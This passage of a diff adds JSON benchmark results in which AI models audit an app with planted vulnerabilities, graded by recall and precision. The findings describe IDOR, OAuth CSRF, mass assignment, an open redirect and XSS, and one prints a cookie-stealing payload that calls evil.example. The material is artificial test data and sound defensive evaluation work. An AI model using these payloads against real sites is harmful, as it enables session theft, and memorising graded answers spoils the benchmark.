+              "evidence": "`settingsSchema` ends with `.passthrough()` and the action runs `.set({ ...data, updated_at: new Date() })`, so any extra JSON key is written straight to the profiles row: an attacker POSTing `{...valid, user_id: \"<victim id>\"}` reassigns their profile row to the victim (shadowing/poisoning the victim's profile), and any other client-unsettable profile column can be overwritten."
+            },
+            {
+              "file": "src/components/ui/Markdown.tsx",
+              "line": 53,
+              "category": "xss",
+              "severity": "medium",
+              "title": "rehype-raw renders unsanitized raw HTML from markdown text",
+              "evidence": "`rehypePlugins={[rehypeRaw]}` parses embedded HTML in `text` and renders it without rehype-sanitize; any markdown rendered through this component that is influenced by user or AI output (e.g. coach replies derived from user chat/meal data) containing `<img src=x onerror=...>` or script/iframe elements is injected into the DOM."
+            }
+          ],
+          "seconds": 202.7,
+          "inputTokens": 10655,
+          "outputTokens": 13180,
+          "grade": {
+            "found": [
+              "V1",
+              "V2",
+              "V3",
+              "V4",
+              "V5",
+              "V7",
+              "V8"
+            ],
+            "missed": [
+              "V6"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/connect/route.ts",
+                  "line": 13,
+                  "category": "open-redirect",
+                  "severity": "medium",
+                  "title": "Unvalidated `next` parameter allows open redirect",
+                  "evidence": "`return NextResponse.redirect(new URL(next ?? \"/settings?whoop=env\", request.url))` — `new URL` ignores the base when `next` is absolute, so `GET /api/whoop/connect?next=https://evil.com` (when Whoop env vars are absent) redirects the logged-in victim to an attacker-controlled site for phishing/credential capture."
+                },
+                "planted": "V8"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/callback/route.ts",
+                  "line": 21,
+                  "category": "csrf",
+                  "severity": "medium",
+                  "title": "OAuth state validation fails open when the state cookie is missing",
+                  "evidence": "`if (!code || (expected && state !== expected))` — when the `whoop_oauth_state` cookie is absent the state comparison is skipped entirely, so an attacker who obtains an authorization code for their own Whoop account can send the logged-in victim `/api/whoop/callback?code=ATTACKER_CODE` and silently link the attacker's Whoop account to the victim's profile (OAuth login-CSRF)."
+                },
+                "planted": "V2"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 16,
+                  "category": "authentication",
+                  "severity": "medium",
+                  "title": "Cron endpoint authentication fails open when CRON_SECRET is unset",
+                  "evidence": "`if (cronSecret && auth !== `Bearer ${cronSecret}`)` — if the CRON_SECRET env var is not configured the check is skipped, so any unauthenticated attacker can GET this route and trigger `pruneEvents`/`expireStaleFacts`/`consolidateMemories`, destructively modifying/pruning all users' data on demand."
+                },
+                "planted": "V1"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 46,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "deleteSubscription ignores its userId parameter (cross-user deletion)",
+                  "evidence": "`deleteSubscription(userId, endpoint)` deletes `.where(eq(push_subscriptions.endpoint, endpoint))` with no `user_id` condition, so any authenticated user can `DELETE /api/push/subscribe` with a victim's endpoint and delete the victim's push subscription (silent notification DoS)."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/meals.ts",
+                  "line": 172,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "repeatMeal reads another user's meal without user_id scoping (IDOR)",
+                  "evidence": "`repeatMeal` selects `from(meals).where(eq(meals.id, mealId))` with no `eq(meals.user_id, user.id)` filter (unlike updateMeal/deleteMeal), then copies the row's name, place and macros into the caller's account — an attacker who learns another user's mealId can exfiltrate that user's meal data."
+                },
+                "planted": "V4"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/profile.ts",
+                  "line": 117,
+                  "category": "mass-assignment",
+                  "severity": "high",
+                  "title": "updateProfileSettings spreads passthrough zod keys directly into the DB update",
+                  "evidence": "`settingsSchema` ends with `.passthrough()` and the action runs `.set({ ...data, updated_at: new Date() })`, so any extra JSON key is written straight to the profiles row: an attacker POSTing `{...valid, user_id: \"<victim id>\"}` reassigns their profile row to the victim (shadowing/poisoning the victim's profile), and any other client-unsettable profile column can be overwritten."
+                },
+                "planted": "V5"
+              },
+              {
+                "finding": {
+                  "file": "src/components/ui/Markdown.tsx",
+                  "line": 53,
+                  "category": "xss",
+                  "severity": "medium",
+                  "title": "rehype-raw renders unsanitized raw HTML from markdown text",
+                  "evidence": "`rehypePlugins={[rehypeRaw]}` parses embedded HTML in `text` and renders it without rehype-sanitize; any markdown rendered through this component that is influenced by user or AI output (e.g. coach replies derived from user chat/meal data) containing `<img src=x onerror=...>` or script/iframe elements is injected into the DOM."
+                },
+                "planted": "V7"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.875,
+            "precision": 1
+          }
+        },
+        {
+          "rep": 2,
+          "ok": false,
+          "findings": [],
+          "seconds": 600,
+          "error": "The operation was aborted due to timeout",
+          "grade": {
+            "found": [],
+            "missed": [
+              "V1",
+              "V2",
+              "V3",
+              "V4",
+              "V5",
+              "V6",
+              "V7",
+              "V8"
+            ],
+            "matched": [],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0,
+            "precision": 0
+          }
+        },
+        {
+          "rep": 3,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/components/ui/Markdown.tsx",
+              "line": 53,
+              "category": "xss",
+              "severity": "high",
+              "title": "Raw HTML rendered via rehype-raw without sanitization enables XSS",
+              "evidence": "`rehypePlugins={[rehypeRaw]}` parses embedded HTML into the render tree with no rehype-sanitize, so any text passed to <Markdown> containing `<iframe srcdoc=\"<script>fetch('//evil.example/'+document.cookie)</script>\"></iframe>` (or other raw HTML) executes same-origin script in the reader's browser whenever the rendered text is attacker-influenced (e.g. coach replies echoing user chat messages or meal names)."
+            },
+            {
+              "file": "src/app/api/whoop/connect/route.ts",
+              "line": 13,
+              "category": "open-redirect",
+              "severity": "medium",
+              "title": "Unvalidated `next` query parameter allows open redirect",
+              "evidence": "`new URL(next ?? \"/settings?whoop=env\", request.url)` redirects to the fully attacker-controlled `next` value; a victim clicking `https://app.example/api/whoop/connect?next=https://evil.example/phish` (or `next=//evil.example`) is redirected off the trusted domain for phishing whenever the Whoop env branch is taken."
+            },
+            {
+              "file": "src/app/api/whoop/callback/route.ts",
+              "line": 21,
+              "category": "csrf",
+              "severity": "medium",
+              "title": "OAuth state validation is skipped when the state cookie is absent",
+              "evidence": "`if (!code || (expected && state !== expected))` skips the state check entirely when the whoop_oauth_state cookie is missing; an attacker who obtains their own Whoop authorization code can get a logged-in victim (who never started the flow, so has no cookie) to open `/api/whoop/callback?code=ATTACKER_CODE&state=x`, force-linking the attacker's Whoop account and syncing its data into the victim's account."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 45,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "deleteSubscription ignores its userId argument, allowing cross-user deletion",
+              "evidence": "The DELETE filters only on `eq(push_subscriptions.endpoint, endpoint)` while the `userId` parameter is unused; any authenticated user can send `DELETE /api/push/subscribe` with `{\"endpoint\": \"<victim's push endpoint>\"}` to remove another user's subscription and silently suppress their push notifications."
+            },
+            {
+              "file": "src/lib/actions/meals.ts",
+              "line": 172,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "repeatMeal reads the source meal without a user ownership check",
+              "evidence": "`where(eq(meals.id, mealId))` has no `meals.user_id` filter (unlike updateMeal/deleteMeal in the same file); an authenticated attacker who obtains another user's mealId can call `repeatMeal` to copy that victim's meal data (name, place, macros, catalog_item_id) into the attacker's own account."
+            },
+            {
+              "file": "src/lib/actions/profile.ts",
+              "line": 117,
+              "category": "mass-assignment",
+              "severity": "medium",
+              "title": "passthrough() schema spread directly into UPDATE allows mass assignment of arbitrary profile columns",
+              "evidence": "`settingsSchema` ends with `.passthrough()` and `.set({ ...data, updated_at: new Date() })` writes every submitted key to the profiles row; a caller can send `{sex:\"male\",timezone:\"UTC\",day_cutoff_hour:0,birth_year:2000,height_cm:180,coach_rules:\"<arbitrarily long string>\",user_id:\"<other user>\"}` to overwrite columns protected by other actions (bypassing COACH_RULES_MAX / chat_language / dining_mode validation) and even reassign the row's user_id."
+            },
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 16,
+              "category": "authentication",
+              "severity": "medium",
+              "title": "Cron endpoint fails open when CRON_SECRET is not configured",
+              "evidence": "`if (cronSecret && auth !== `Bearer ${cronSecret}`)` only enforces auth when CRON_SECRET is set; if the env var is unset, any unauthenticated attacker can `GET /api/cron/maintenance` to run pruneEvents/expireStaleFacts/consolidateMemories and delete or rewrite all users' data."
+            }
+          ],
+          "seconds": 223.6,
+          "inputTokens": 10655,
+          "outputTokens": 14030,
+          "grade": {
+            "found": [
+              "V1",
+              "V2",
+              "V3",
+              "V4",
+              "V5",
+              "V7",
+              "V8"
+            ],
+            "missed": [
+              "V6"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/components/ui/Markdown.tsx",
+                  "line": 53,
+                  "category": "xss",
+                  "severity": "high",
+                  "title": "Raw HTML rendered via rehype-raw without sanitization enables XSS",
+                  "evidence": "`rehypePlugins={[rehypeRaw]}` parses embedded HTML into the render tree with no rehype-sanitize, so any text passed to <Markdown> containing `<iframe srcdoc=\"<script>fetch('//evil.example/'+document.cookie)</script>\"></iframe>` (or other raw HTML) executes same-origin script in the reader's browser whenever the rendered text is attacker-influenced (e.g. coach replies echoing user chat messages or meal names)."
+                },
+                "planted": "V7"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/connect/route.ts",
+                  "line": 13,
+                  "category": "open-redirect",
+                  "severity": "medium",
+                  "title": "Unvalidated `next` query parameter allows open redirect",
+                  "evidence": "`new URL(next ?? \"/settings?whoop=env\", request.url)` redirects to the fully attacker-controlled `next` value; a victim clicking `https://app.example/api/whoop/connect?next=https://evil.example/phish` (or `next=//evil.example`) is redirected off the trusted domain for phishing whenever the Whoop env branch is taken."
+                },
+                "planted": "V8"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/callback/route.ts",
+                  "line": 21,
+                  "category": "csrf",
+                  "severity": "medium",
+                  "title": "OAuth state validation is skipped when the state cookie is absent",
+                  "evidence": "`if (!code || (expected && state !== expected))` skips the state check entirely when the whoop_oauth_state cookie is missing; an attacker who obtains their own Whoop authorization code can get a logged-in victim (who never started the flow, so has no cookie) to open `/api/whoop/callback?code=ATTACKER_CODE&state=x`, force-linking the attacker's Whoop account and syncing its data into the victim's account."
+                },
+                "planted": "V2"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 45,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "deleteSubscription ignores its userId argument, allowing cross-user deletion",
+                  "evidence": "The DELETE filters only on `eq(push_subscriptions.endpoint, endpoint)` while the `userId` parameter is unused; any authenticated user can send `DELETE /api/push/subscribe` with `{\"endpoint\": \"<victim's push endpoint>\"}` to remove another user's subscription and silently suppress their push notifications."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/meals.ts",
+                  "line": 172,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "repeatMeal reads the source meal without a user ownership check",
+                  "evidence": "`where(eq(meals.id, mealId))` has no `meals.user_id` filter (unlike updateMeal/deleteMeal in the same file); an authenticated attacker who obtains another user's mealId can call `repeatMeal` to copy that victim's meal data (name, place, macros, catalog_item_id) into the attacker's own account."
+                },
+                "planted": "V4"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/profile.ts",
+                  "line": 117,
+                  "category": "mass-assignment",
+                  "severity": "medium",
+                  "title": "passthrough() schema spread directly into UPDATE allows mass assignment of arbitrary profile columns",
+                  "evidence": "`settingsSchema` ends with `.passthrough()` and `.set({ ...data, updated_at: new Date() })` writes every submitted key to the profiles row; a caller can send `{sex:\"male\",timezone:\"UTC\",day_cutoff_hour:0,birth_year:2000,height_cm:180,coach_rules:\"<arbitrarily long string>\",user_id:\"<other user>\"}` to overwrite columns protected by other actions (bypassing COACH_RULES_MAX / chat_language / dining_mode validation) and even reassign the row's user_id."
+                },
+                "planted": "V5"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 16,
+                  "category": "authentication",
+                  "severity": "medium",
+                  "title": "Cron endpoint fails open when CRON_SECRET is not configured",
+                  "evidence": "`if (cronSecret && auth !== `Bearer ${cronSecret}`)` only enforces auth when CRON_SECRET is set; if the env var is unset, any unauthenticated attacker can `GET /api/cron/maintenance` to run pruneEvents/expireStaleFacts/consolidateMemories and delete or rewrite all users' data."
+                },
+                "planted": "V1"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.875,
+            "precision": 1
+          }
+        }
+      ]
+    },
+    {
+      "summary": {
+        "model": "explabs:kimi-k3",
+        "reps": 3,
+        "completed": 1,
+        "errors": 2,
+        "meanRecall": 0.875,
+        "meanPrecision": 1,
+        "unmatchedFindings": 0,
+        "duplicateFindings": 0,
+        "foundPerPlant": {
+          "V1": 1,
+          "V2": 1,
+          "V3": 1,
+          "V4": 1,
+          "V5": 1,
+          "V6": 0,
+          "V7": 1,
+          "V8": 1
+        },
+        "foundInEveryRep": [
+          "V1",
+          "V2",
+          "V3",
+          "V4",
+          "V5",
+          "V7",
+          "V8"
+        ],
+        "neverFound": [
+          "V6"
+        ],
+        "meanSecondsCompleted": 261.2
+      },
+      "reps": [
+        {
+          "rep": 1,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 16,
+              "category": "authentication",
+              "severity": "medium",
+              "title": "Cron endpoint is unauthenticated when CRON_SECRET is unset",
+              "evidence": "The guard `if (cronSecret && auth !== `Bearer ${cronSecret}`)` is skipped entirely when process.env.CRON_SECRET is undefined, so any unauthenticated attacker can GET /api/cron/maintenance and trigger the destructive maintenance jobs (expireStaleFacts, consolidateMemories, pruneEvents)."
+            },
+            {
+              "file": "src/app/api/whoop/connect/route.ts",
+              "line": 13,
+              "category": "open-redirect",
+              "severity": "low",
+              "title": "Open redirect via attacker-controlled next parameter",
+              "evidence": "`new URL(next ?? \"/settings?whoop=env\", request.url)` uses the query param directly, so a logged-in victim visiting /api/whoop/connect?next=https://evil.com is redirected to the attacker's site (whenever Whoop env vars are unconfigured), enabling phishing."
+            },
+            {
+              "file": "src/app/api/whoop/callback/route.ts",
+              "line": 21,
+              "category": "csrf",
+              "severity": "medium",
+              "title": "OAuth state check is bypassed when the state cookie is absent",
+              "evidence": "`if (!code || (expected && state !== expected))` only compares state when the cookie exists; an attacker who completes the Whoop flow with their own account can lure a logged-in victim (who has no whoop_oauth_state cookie) to /api/whoop/callback?code=<attacker_code>&state=x, causing connectWhoop/syncWhoop to link and sync the attacker's Whoop data into the victim's account."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 46,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "deleteSubscription ignores userId, allowing cross-user subscription deletion",
+              "evidence": "The DELETE in /api/push/subscribe passes user.id, but the where clause is only `eq(push_subscriptions.endpoint, endpoint)` with no user_id predicate, so any authenticated user who knows a victim's push endpoint can delete the victim's subscription and silently disable their notifications."
+            },
+            {
+              "file": "src/lib/actions/meals.ts",
+              "line": 172,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "repeatMeal copies any user's meal without an ownership check",
+              "evidence": "The source lookup filters only by `eq(meals.id, mealId)` (no user_id), so an authenticated attacker can call the repeatMeal server action with another user's meal ID and have that user's meal name, place, and macro data inserted into their own account, disclosing it cross-tenant."
+            },
+            {
+              "file": "src/lib/actions/profile.ts",
+              "line": 117,
+              "category": "mass-assignment",
+              "severity": "medium",
+              "title": "Passthrough schema lets clients overwrite arbitrary profile columns",
+              "evidence": "settingsSchema uses `.passthrough()` (line 109) and the update does `.set({ ...data, updated_at: new Date() })`, so an attacker can add extra keys to the updateProfileSettings payload (e.g. coach_rules, summary_rules, or user_id) and write arbitrary columns of the profiles row beyond the five intended settings."
+            },
+            {
+              "file": "src/components/ui/Markdown.tsx",
+              "line": 53,
+              "category": "xss",
+              "severity": "medium",
+              "title": "rehypeRaw renders unsanitized raw HTML, enabling XSS",
+              "evidence": "`rehypePlugins={[rehypeRaw]}` is applied without rehype-sanitize, so any attacker-influenced markdown passed to this component (e.g. AI coach output steered via prompt injection through user/integration data) containing `<img src=x onerror=...>` or similar HTML executes JavaScript in the viewing user's browser."
+            }
+          ],
+          "seconds": 261.2,
+          "inputTokens": 10757,
+          "outputTokens": 7039,
+          "grade": {
+            "found": [
+              "V1",
+              "V2",
+              "V3",
+              "V4",
+              "V5",
+              "V7",
+              "V8"
+            ],
+            "missed": [
+              "V6"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 16,
+                  "category": "authentication",
+                  "severity": "medium",
+                  "title": "Cron endpoint is unauthenticated when CRON_SECRET is unset",
+                  "evidence": "The guard `if (cronSecret && auth !== `Bearer ${cronSecret}`)` is skipped entirely when process.env.CRON_SECRET is undefined, so any unauthenticated attacker can GET /api/cron/maintenance and trigger the destructive maintenance jobs (expireStaleFacts, consolidateMemories, pruneEvents)."
+                },
+                "planted": "V1"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/connect/route.ts",
+                  "line": 13,
+                  "category": "open-redirect",
+                  "severity": "low",
+                  "title": "Open redirect via attacker-controlled next parameter",
+                  "evidence": "`new URL(next ?? \"/settings?whoop=env\", request.url)` uses the query param directly, so a logged-in victim visiting /api/whoop/connect?next=https://evil.com is redirected to the attacker's site (whenever Whoop env vars are unconfigured), enabling phishing."
+                },
+                "planted": "V8"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/callback/route.ts",
+                  "line": 21,
+                  "category": "csrf",
+                  "severity": "medium",
+                  "title": "OAuth state check is bypassed when the state cookie is absent",
+                  "evidence": "`if (!code || (expected && state !== expected))` only compares state when the cookie exists; an attacker who completes the Whoop flow with their own account can lure a logged-in victim (who has no whoop_oauth_state cookie) to /api/whoop/callback?code=<attacker_code>&state=x, causing connectWhoop/syncWhoop to link and sync the attacker's Whoop data into the victim's account."
+                },
+                "planted": "V2"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 46,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "deleteSubscription ignores userId, allowing cross-user subscription deletion",
+                  "evidence": "The DELETE in /api/push/subscribe passes user.id, but the where clause is only `eq(push_subscriptions.endpoint, endpoint)` with no user_id predicate, so any authenticated user who knows a victim's push endpoint can delete the victim's subscription and silently disable their notifications."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/meals.ts",
+                  "line": 172,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "repeatMeal copies any user's meal without an ownership check",
+                  "evidence": "The source lookup filters only by `eq(meals.id, mealId)` (no user_id), so an authenticated attacker can call the repeatMeal server action with another user's meal ID and have that user's meal name, place, and macro data inserted into their own account, disclosing it cross-tenant."
+                },
+                "planted": "V4"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/profile.ts",
+                  "line": 117,
+                  "category": "mass-assignment",
+                  "severity": "medium",
+                  "title": "Passthrough schema lets clients overwrite arbitrary profile columns",
+                  "evidence": "settingsSchema uses `.passthrough()` (line 109) and the update does `.set({ ...data, updated_at: new Date() })`, so an attacker can add extra keys to the updateProfileSettings payload (e.g. coach_rules, summary_rules, or user_id) and write arbitrary columns of the profiles row beyond the five intended settings."
+                },
+                "planted": "V5"
+              },
+              {
+                "finding": {
+                  "file": "src/components/ui/Markdown.tsx",
+                  "line": 53,
+                  "category": "xss",
+                  "severity": "medium",
+                  "title": "rehypeRaw renders unsanitized raw HTML, enabling XSS",
+                  "evidence": "`rehypePlugins={[rehypeRaw]}` is applied without rehype-sanitize, so any attacker-influenced markdown passed to this component (e.g. AI coach output steered via prompt injection through user/integration data) containing `<img src=x onerror=...>` or similar HTML executes JavaScript in the viewing user's browser."
+                },
+                "planted": "V7"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.875,
+            "precision": 1
+          }
+        },
+        {
+          "rep": 2,
+          "ok": false,
+          "findings": [],
+          "seconds": 600,
+          "error": "The operation was aborted due to timeout",
+          "grade": {
+            "found": [],
+            "missed": [
+              "V1",
+              "V2",
+              "V3",
+              "V4",
+              "V5",
+              "V6",
+              "V7",
+              "V8"
+            ],
+            "matched": [],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0,
+            "precision": 0
+          }
+        },
+        {
+          "rep": 3,
+          "ok": false,
+          "findings": [],
+          "seconds": 600,
+          "error": "The operation was aborted due to timeout",
+          "grade": {
+            "found": [],
+            "missed": [
+              "V1",
+              "V2",
+              "V3",
+              "V4",
+              "V5",
+              "V6",
+              "V7",
+              "V8"
+            ],
+            "matched": [],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0,
+            "precision": 0
+          }
+        }
+      ]
+    },
+    {
+      "summary": {
+        "model": "explabs:gpt-5.6-luna",
+        "reps": 3,
+        "completed": 3,
+        "errors": 0,
+        "meanRecall": 0.583,
+        "meanPrecision": 1,
+        "unmatchedFindings": 0,
+        "duplicateFindings": 0,
+        "foundPerPlant": {
+          "V1": 3,
+          "V2": 3,
+          "V3": 3,
+          "V4": 3,
+          "V5": 1,
+          "V6": 0,
+          "V7": 0,
+          "V8": 1
+        },
+        "foundInEveryRep": [
+          "V1",
+          "V2",
+          "V3",
+          "V4"
+        ],
+        "neverFound": [
+          "V6",
+          "V7"
+        ],
+        "meanSecondsCompleted": 19.7
+      },
+      "reps": [
+        {
+          "rep": 1,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 16,
+              "category": "authentication",
+              "severity": "high",
+              "title": "Maintenance endpoint is unauthenticated when CRON_SECRET is unset",
+              "evidence": "The route only rejects requests when `cronSecret` is truthy: `if (cronSecret && auth !== \\`Bearer ${cronSecret}\\`)`. If the environment variable is missing, any attacker can send `GET /api/cron/maintenance` and trigger `expireStaleFacts`, `consolidateMemories`, and `pruneEvents` across the application."
+            },
+            {
+              "file": "src/app/api/whoop/callback/route.ts",
+              "line": 21,
+              "category": "csrf",
+              "severity": "high",
+              "title": "OAuth callback accepts an arbitrary state when the state cookie is absent",
+              "evidence": "The check is `if (!code || (expected && state !== expected))`, so a callback with a valid `code` and attacker-chosen or missing `state` is accepted when `whoop_oauth_state` is absent. An attacker can cause a logged-in victim to visit such a callback using the attacker's Whoop authorization code, causing `connectWhoop(user.id, code)` and linking the attacker's Whoop account to the victim."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 46,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "Push subscription deletion ignores the owning user",
+              "evidence": "`deleteSubscription` accepts `userId` but deletes solely with `eq(push_subscriptions.endpoint, endpoint)`. An authenticated attacker who supplies another user's known push endpoint to `DELETE /api/push/subscribe` can delete that user's subscription and prevent their push notifications."
+            },
+            {
+              "file": "src/lib/actions/meals.ts",
+              "line": 172,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "Any user can repeat another user's meal by ID",
+              "evidence": "The source meal lookup filters only on `eq(meals.id, mealId)` and does not constrain `meals.user_id` to the authenticated user. An authenticated attacker who obtains another user's meal ID can call `repeatMeal` and copy that meal's name, place, macros, and catalog reference into the attacker's account."
+            }
+          ],
+          "seconds": 17.5,
+          "inputTokens": 10581,
+          "outputTokens": 1110,
+          "grade": {
+            "found": [
+              "V1",
+              "V2",
+              "V3",
+              "V4"
+            ],
+            "missed": [
+              "V5",
+              "V6",
+              "V7",
+              "V8"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 16,
+                  "category": "authentication",
+                  "severity": "high",
+                  "title": "Maintenance endpoint is unauthenticated when CRON_SECRET is unset",
+                  "evidence": "The route only rejects requests when `cronSecret` is truthy: `if (cronSecret && auth !== \\`Bearer ${cronSecret}\\`)`. If the environment variable is missing, any attacker can send `GET /api/cron/maintenance` and trigger `expireStaleFacts`, `consolidateMemories`, and `pruneEvents` across the application."
+                },
+                "planted": "V1"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/callback/route.ts",
+                  "line": 21,
+                  "category": "csrf",
+                  "severity": "high",
+                  "title": "OAuth callback accepts an arbitrary state when the state cookie is absent",
+                  "evidence": "The check is `if (!code || (expected && state !== expected))`, so a callback with a valid `code` and attacker-chosen or missing `state` is accepted when `whoop_oauth_state` is absent. An attacker can cause a logged-in victim to visit such a callback using the attacker's Whoop authorization code, causing `connectWhoop(user.id, code)` and linking the attacker's Whoop account to the victim."
+                },
+                "planted": "V2"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 46,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "Push subscription deletion ignores the owning user",
+                  "evidence": "`deleteSubscription` accepts `userId` but deletes solely with `eq(push_subscriptions.endpoint, endpoint)`. An authenticated attacker who supplies another user's known push endpoint to `DELETE /api/push/subscribe` can delete that user's subscription and prevent their push notifications."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/meals.ts",
+                  "line": 172,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "Any user can repeat another user's meal by ID",
+                  "evidence": "The source meal lookup filters only on `eq(meals.id, mealId)` and does not constrain `meals.user_id` to the authenticated user. An authenticated attacker who obtains another user's meal ID can call `repeatMeal` and copy that meal's name, place, macros, and catalog reference into the attacker's account."
+                },
+                "planted": "V4"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.5,
+            "precision": 1
+          }
+        },
+        {
+          "rep": 2,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 16,
+              "category": "authentication",
+              "severity": "high",
+              "title": "Maintenance endpoint is unauthenticated when CRON_SECRET is unset",
+              "evidence": "The authorization check only rejects requests when `cronSecret` is truthy: `if (cronSecret && auth !== \\`Bearer ${cronSecret}\\`)`. If `CRON_SECRET` is missing or empty, any unauthenticated attacker can call `GET /api/cron/maintenance` and trigger `expireStaleFacts`, `consolidateMemories`, and `pruneEvents` at lines 20–22, causing unauthorized data modification/deletion."
+            },
+            {
+              "file": "src/app/api/whoop/callback/route.ts",
+              "line": 21,
+              "category": "csrf",
+              "severity": "high",
+              "title": "OAuth callback accepts arbitrary state when the state cookie is missing",
+              "evidence": "The callback rejects only when `expected` exists and differs: `if (!code || (expected && state !== expected))`; with no `whoop_oauth_state` cookie, an attacker-supplied `state` is accepted and `connectWhoop(user.id, code)` runs at line 26. An attacker can cause an authenticated victim to visit a callback URL containing the attacker's authorization code, potentially linking the attacker's Whoop account to the victim's account and importing the attacker's data during `syncWhoop`."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 46,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "Deleting a push subscription ignores its owner",
+              "evidence": "`deleteSubscription` receives `userId` but deletes with only `eq(push_subscriptions.endpoint, endpoint)` at lines 45–47, omitting `push_subscriptions.user_id`. An authenticated attacker who supplies another user's endpoint can delete that user's subscription, preventing push notifications, despite not owning it."
+            },
+            {
+              "file": "src/lib/actions/meals.ts",
+              "line": 171,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "Meal repetition reads another user's meal by ID",
+              "evidence": "The source lookup filters only on `eq(meals.id, mealId)` at lines 169–173, not `meals.user_id = user.id`; the selected meal is then copied into the caller's account at lines 177–189. An authenticated attacker who obtains another meal ID can repeat it and disclose/copy that user's meal name, location, and nutritional data into their own account."
+            }
+          ],
+          "seconds": 17.4,
+          "inputTokens": 10581,
+          "outputTokens": 1038,
+          "grade": {
+            "found": [
+              "V1",
+              "V2",
+              "V3",
+              "V4"
+            ],
+            "missed": [
+              "V5",
+              "V6",
+              "V7",
+              "V8"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 16,
+                  "category": "authentication",
+                  "severity": "high",
+                  "title": "Maintenance endpoint is unauthenticated when CRON_SECRET is unset",
+                  "evidence": "The authorization check only rejects requests when `cronSecret` is truthy: `if (cronSecret && auth !== \\`Bearer ${cronSecret}\\`)`. If `CRON_SECRET` is missing or empty, any unauthenticated attacker can call `GET /api/cron/maintenance` and trigger `expireStaleFacts`, `consolidateMemories`, and `pruneEvents` at lines 20–22, causing unauthorized data modification/deletion."
+                },
+                "planted": "V1"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/callback/route.ts",
+                  "line": 21,
+                  "category": "csrf",
+                  "severity": "high",
+                  "title": "OAuth callback accepts arbitrary state when the state cookie is missing",
+                  "evidence": "The callback rejects only when `expected` exists and differs: `if (!code || (expected && state !== expected))`; with no `whoop_oauth_state` cookie, an attacker-supplied `state` is accepted and `connectWhoop(user.id, code)` runs at line 26. An attacker can cause an authenticated victim to visit a callback URL containing the attacker's authorization code, potentially linking the attacker's Whoop account to the victim's account and importing the attacker's data during `syncWhoop`."
+                },
+                "planted": "V2"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 46,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "Deleting a push subscription ignores its owner",
+                  "evidence": "`deleteSubscription` receives `userId` but deletes with only `eq(push_subscriptions.endpoint, endpoint)` at lines 45–47, omitting `push_subscriptions.user_id`. An authenticated attacker who supplies another user's endpoint can delete that user's subscription, preventing push notifications, despite not owning it."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
